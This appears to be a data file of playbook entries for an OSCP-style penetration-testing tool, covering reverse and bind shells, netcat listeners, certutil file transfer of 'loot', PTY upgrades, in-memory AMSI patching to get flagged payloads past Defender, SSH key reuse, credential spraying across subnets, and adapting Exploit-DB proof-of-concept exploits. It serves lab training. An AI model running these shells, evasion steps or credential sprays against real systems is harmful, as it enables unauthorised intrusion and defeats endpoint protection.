name: Reverse shells & handlers (§3)
description: Once a foothold or command-execution path exists, catch and stabilise an interactive shell: stand up a listener, craft a reverse-shell payload for the target OS, then upgrade to a full PTY. Payloads are only crafted and handed to the operator, never auto-fired, an OSCP requirement; the listener runs locally.

actions.title: Start a Reverse-Shell Listener
actions.hypothesis: Any reverse-shell payload needs a listener already waiting on your LHOST to catch the callback before it fires.
actions.proves: a listener bound and ready to catch a reverse shell
actions.does_not_prove: a caught shell, nothing lands until a callback actually connects

actions.title: Reverse Shell Never Connects - Egress Is Filtered
actions.hypothesis: Your payload ran but nothing hit your listener, or a test connection is refused/timed out: the target cannot reach you OUTBOUND on that port. The box is not unexploitable - pick a port egress allows (443/53 almost always leave), or flip the direction with a BIND shell and connect IN to the target instead.
actions.proves: nothing attack-wise; it gets a shell channel through a filtered egress
actions.does_not_prove: that all egress is blocked - usually only some ports are; 443/53 commonly pass

commands.run: sudo nc -lvnp 443   # and point the payload at {{lhost}}:443
commands.note: Retry the reverse shell on 443 (then 53): outbound web/DNS almost always leaves even a filtered network. Needs sudo to bind <1024.

commands.run: # on the TARGET: nc -lvnp 4444 -e /bin/bash   # then from Kali: nc {{target}} 4444
commands.note: BIND shell: if the target cannot dial OUT but you can reach a port IN, have IT listen and you connect. The inverse of a reverse shell.

commands.run: ss -tlnp; iptables -L -n   # (from any foothold) confirm what egress/listeners exist
commands.note: If you already have any foothold, check its own firewall/egress so you choose a port that actually works instead of guessing.

actions.title: Certutil Rejected Your Arguments
actions.hypothesis: Certutil printed a usage or argument error, so the command never ran. Its syntax is strict and order sensitive: for a download use -urlcache -split -f with the URL first and the output path last; for a text-safe transfer, -encode the file on the source and -decode it on the target. Most 'too many arguments' errors are a missing -f or a flipped URL and path order.
actions.proves: nothing attack-wise; it gets the file transfer or encode command to actually run
actions.does_not_prove: that certutil is the only option; iwr, bitsadmin, and an SMB copy also move files

commands.note: Download a file. The -f forces a fresh fetch, -split writes the body, the URL comes first and the output path LAST. A flipped order or a missing -f is the usual 'too many arguments' cause.

commands.run: certutil -encode loot.zip loot.b64   # on the SOURCE, then move the text
commands.note: Base64-encode a file for transfer when a raw download is blocked or binary-unsafe. Exactly two positional args: input then output.

commands.run: certutil -decode loot.b64 loot.zip   # on the TARGET
commands.note: Decode the base64 back to the original bytes. Two positional args, input then output, no extra flags.

actions.title: Linux Reverse-Shell Payload
actions.hypothesis: A confirmed command-execution primitive on a Linux target becomes an interactive shell by firing a bash or python callback back to your listener.
actions.proves: an interactive shell on the Linux target (once caught)
actions.does_not_prove: privileged access, the shell arrives as the exploited service's user, nothing more

actions.title: Windows Reverse-Shell Payload
actions.hypothesis: A command-execution primitive on Windows becomes a shell via a PowerShell or nc.exe callback back to your listener.
actions.proves: an interactive shell on the Windows target (once caught)
actions.does_not_prove: administrator or SYSTEM, the shell arrives as the exploited process's user

actions.title: Upgrade a Dumb Shell to a Full PTY
actions.hypothesis: A freshly caught reverse shell is line-buffered and drops Ctrl-C and arrow keys; upgrading it to a PTY gives a real terminal, which su, sudo, and vim all need.
actions.proves: a fully-interactive TTY on the target
actions.does_not_prove: any new access, it only stabilises the shell you already hold

commands.run: python3 -c 'import pty;pty.spawn("/bin/bash")'  # then Ctrl-Z; stty raw -echo; fg; export TERM=xterm

actions.title: No TTY - Upgrade to a Real Shell
actions.hypothesis: 'sudo: no tty present' / 'must be run from a terminal' means your shell is a dumb pipe (a web/reverse shell) with no controlling terminal - sudo, su, ssh and many interactive tools refuse to run. Spawn a PTY and they work. This is the first thing to do on nearly every raw reverse shell.
actions.proves: nothing attack-wise; it turns a dumb shell into an interactive PTY so terminal-only commands run
actions.does_not_prove: a better privilege - same user, now with a usable terminal

report.finding: Dumb shell upgraded to a PTY

commands.note: Spawn a PTY (python2: same with python). If python is absent: `script -qc /bin/bash /dev/null`.

commands.run: # Ctrl-Z, then on Kali: stty raw -echo; fg ; then in the shell: export TERM=xterm; stty rows 50 cols 200
commands.note: Full upgrade: background the shell, set your terminal raw, foreground it, and fix TERM/size so arrow keys, tab-complete, and clear work. Now sudo/su run.

actions.title: Your Uploaded Tool Won't Run - Fix It
actions.hypothesis: "bad interpreter: No such file or directory" on a script you uploaded means Windows CRLF line endings - the kernel looks for an interpreter literally named `/bin/bash\r`. Strip the carriage returns and it runs. The same family of wall: a binary in a noexec /tmp, or one you forgot to chmod +x.
actions.proves: nothing attack-wise; it gets your own tooling running on the foothold
actions.does_not_prove: anything about the target beyond its mount options

report.finding: Uploaded tool blocked by line endings / exec perms

commands.note: CRLF fix: strips the carriage returns so the shebang resolves. The #1 cause of "bad interpreter".

NOEXEC /tmp: if a binary gives "Permission denied" even after chmod +x, /tmp is mounted noexec - run it from /dev/shm or your home. Last resort: invoke the loader directly: /lib64/ld-linux-x86-64.so.2 ./{{binary}}.

actions.title: Defender / AMSI Ate the Payload
actions.hypothesis: "This script contains malicious content" or "contains a virus" is AMSI/Defender flagging a known payload, not a broken technique. Patch AMSI in your current session, obfuscate the script, or switch to a living-off-the-land path that is not signatured. The payload is fine; its signature is the problem.
actions.proves: nothing attack-wise; it gets a blocked payload past the on-host scanner
actions.does_not_prove: that EDR is fully blind; behavioural detection may still fire

commands.note: The classic in-memory AMSI patch for the CURRENT PowerShell session (string-split to dodge the signature on the patch itself). Run it, then your blocked script loads.
If the amsiInitFailed patch is itself signatured: corrupt amsiContext via reflection and Marshal::Copy in the current session, then load your script.

actions.title: Log in over SSH with a Recovered Private Key
actions.hypothesis: A PEM private key recovered from loot (LFI, a backup, a readable home, a git-dump) is a foothold when SSH is reachable, save it, tighten its permissions, and log in. The username is the piece to determine (the key's path/comment, an enumerated user, or the box's theme).
actions.proves: an interactive SSH session as the key's owner (an id/whoami confirms the identity)
actions.does_not_prove: which user the key belongs to until a login succeeds, nor any privilege beyond that user

commands.note: save the recovered key to id_rsa first; try likely usernames (key comment, enumerated users, root). An encrypted key (ENCRYPTED header) → ssh2john id_rsa > k.hash && hashcat/john it, then unlock.

actions.title: SSH Key Rejected - Fix It
actions.hypothesis: A found or planted SSH key that SSH refuses is a puzzle lab authors use to stall you, not a dead end - the key is fine, something around it is wrong. Match the exact error to its fix: local key permissions, a passphrase, the modern ssh-rsa block, a mangled format, or - the sneaky one - the TARGET's own ~/.ssh permissions, which you can only correct from a foothold you already hold. Work the list and the key logs you in.
actions.proves: a working SSH key login once the surrounding blocker is fixed - a foothold
actions.does_not_prove: that the key is valid at all; if every fix fails, the key may be for a different user or host

commands.note: "UNPROTECTED PRIVATE KEY FILE" / "permissions are too open": SSH ignores a world-readable key. This is CLIENT-side (your Kali). Fix and retry.

"Permission denied (publickey)" with "no mutual signature algorithm": OpenSSH 8.8+ disabled ssh-rsa by default, so a valid RSA key is refused. Re-enable it with these two options - the single most common silent failure on older lab keys.
"Enter passphrase for key": the key is encrypted. Crack the passphrase offline, then use it. (A leaked passphrase, e.g. via Heartbleed, skips the crack.)

"Load key: invalid format": usually CRLF line endings from a Windows copy/paste, a missing -----BEGIN/END----- line, or a PuTTY .ppk (convert with `puttygen {{keyfile}} -O private-openssh -o id_rsa`). ssh-keygen -y validates the fixed key.

THE PUZZLE: "Permission denied (publickey)" when the key SHOULD work. SSH StrictModes refuses a key whose ~/.ssh / authorized_keys on the TARGET is group/world-writable or wrongly owned. Run THIS on the target through the foothold you already have (web shell, another account), then retry the key login for a stable session.
Retry after the matching fix. `uid=...` means the key now works - you have your foothold.

actions.title: Authenticated Remote Command (SSH)
actions.hypothesis: With a Linux credential (a password or a private key) and SSH reachable, you can run any command on the box without holding an interactive session, enumerate, hunt privesc, grab flags. The web crafter's Linux 'run on host' menu fills {{command}} (id, sudo -l, SUID find…) and you edit it freely.
actions.proves: command execution on the Linux host as the authenticating user (an id confirms it)
actions.does_not_prove: any privilege beyond that user until a privesc is demonstrated on its own

commands.note: PREFERRED, from Kali: validate the credential over SSH and run {{command}} in one shot, and point {{target}} at a subnet/targets file to spray-and-exec the same cred across every Linux host at once. Swap -p for --key-file id_rsa to use a recovered private key. For a full interactive shell, use the raw ssh below.
Password auth, runs one command and returns. String several with ';' inside the quotes.
Key auth, save the recovered private key to id_rsa first.

actions.title: Run Adapted Exploit-DB PoC for Foothold
actions.hypothesis: Once you have mirrored and inspected the Exploit-DB PoC, fixed any Python 2 syntax or hardcoded Burp proxy, and substituted your target URL/IP and listener address ({{lhost}}:{{lport}}), execute the adapted script with a netcat listener waiting to catch the reverse shell or verify command execution.
actions.proves: remote code execution and an initial shell on the target using the adapted public PoC
actions.does_not_prove: elevated root or SYSTEM privileges unless the vulnerable service itself runs as root or LocalSystem

report.finding: Remote Code Execution via Public Exploit-DB Vulnerability

commands.note: Flag-based PoC invocation: match the exact flag names (--url/-u, --rhost/-t, --lhost, --lport) surfaced during script inspection, with `nc -lvnp {{lport}}` listening in another pane.
Positional sys.argv PoC invocation: pass the target URL or IP and callback address in the exact argv order shown in the script's Usage block.
Shell PoC invocation: run a mirrored Bash/curl exploit script after verifying its target URL and payload arguments.

actions.title: Adapt Legacy Python 2 Exploit-DB PoC to Python 3
actions.hypothesis: Older Exploit-DB scripts fail on modern Kali with `SyntaxError: Missing parentheses in call to 'print'`, `ModuleNotFoundError: No module named 'urllib2'`, or byte/string TypeErrors. Strip CRLF line endings, declare UTF-8 encoding, and convert the script in place with `2to3 -w` (or run under python2 when available) instead of abandoning a valid exploit.
actions.proves: nothing on the target by itself; converts a legacy Python 2 PoC so it executes cleanly under Python 3
actions.does_not_prove: that the target is vulnerable until the converted PoC runs against the service

report.finding: Python 2 Exploit-DB PoC adapted for Python 3

commands.note: Normalize CRLF line endings, add a UTF-8 header for non-ASCII author banners, and rewrite Python 2 print/except/urllib2/raw_input syntax to Python 3.
Verify zero syntax errors remain and check socket/base64 calls where Python 3 expects `bytes` (`b'...'` or `.encode()`) instead of `str`.

actions.title: Resolve Missing Python Exploit Dependencies (PEP 668 Venv)
actions.hypothesis: Modern Debian and Kali block system-wide `pip install` (`error: externally-managed-environment`, PEP 668), and public PoCs frequently import third-party packages (`Crypto`/`pycryptodome`, `requests_toolbelt`, `bs4`, `pwn`, `jwt`, `yaml`). Create a throwaway virtual environment in `/tmp/edb-venv` and install the missing dependency there without touching system packages.
actions.proves: nothing on the target by itself; provisions an isolated Python virtual environment with the packages the PoC imports
actions.does_not_prove: exploit success until you re-run the PoC with `/tmp/edb-venv/bin/python3`

report.finding: Isolated Python venv created for exploit dependencies (PEP 668)

commands.run: python3 -m venv /tmp/edb-venv && /tmp/edb-venv/bin/pip install --upgrade pip pycryptodome requests beautifulsoup4 requests-toolbelt pyyaml PyJWT
commands.note: Create an isolated venv (bypassing PEP 668 cleanly) and install the most common Exploit-DB third-party libraries (`pycryptodome` satisfies `from Crypto...`).
Run the PoC with the venv interpreter directly so every installed package resolves.

actions.title: Fix Hardcoded Burp Proxy or Self-Signed TLS Failure in PoC
actions.hypothesis: Exploit authors routinely leave `proxies = {'http': 'http://127.0.0.1:8080'}` enabled from debugging in Burp, causing `ProxyError` / `Connection refused` when Burp is closed, or fail against lab HTTPS endpoints with `CERTIFICATE_VERIFY_FAILED` because `verify=False` was omitted. Strip the hardcoded proxy or disable certificate verification in the local copy and re-run.
actions.proves: nothing on the target by itself; removes localhost debug proxies and self-signed TLS verification blocks from the PoC
actions.does_not_prove: that the HTTP payload lands until the patched PoC is re-executed against the target

report.finding: Hardcoded debug proxy or TLS verification fixed in PoC

commands.note: Neutralize hardcoded `127.0.0.1:8080` Burp debug proxy dictionaries in the mirrored Python PoC so requests go straight to the target.
Bypass self-signed TLS certificate verification errors (`CERTIFICATE_VERIFY_FAILED`); if `requests` still enforces verify, add `verify=False` to its `.get()` / `.post()` calls.

actions.title: Fix C Exploit Architecture, GLIBC, or Cross-Compile Mismatch
actions.hypothesis: A C exploit compiled on modern Kali links against Kali's new `GLIBC_2.3x` and 64-bit ABI, failing on older targets with `version GLIBC_2.34 not found` or `Exec format error`. Prefer compiling directly on the target if `gcc` is present; otherwise link statically (`-static`), target 32-bit (`-m32` with `gcc-multilib`), or cross-compile Windows `.c` PoCs with `x86_64-w64-mingw32-gcc`.
actions.proves: nothing on the target by itself; produces a binary matching the target OS, CPU word size, and C runtime
actions.does_not_prove: privilege escalation until the compiled binary runs on the target

report.finding: C exploit compiled to match target architecture and libc

commands.note: Compile statically on Kali so the binary carries no dynamic `GLIBC_2.3x` dependency (use `-m32` when `uname -m` on the target is `i686`; install `gcc-multilib` if `gnu/stubs-32.h` is missing).
Cross-compile a Windows C exploit from Kali into a standalone PE executable (`use i686-w64-mingw32-gcc` for 32-bit Windows targets).
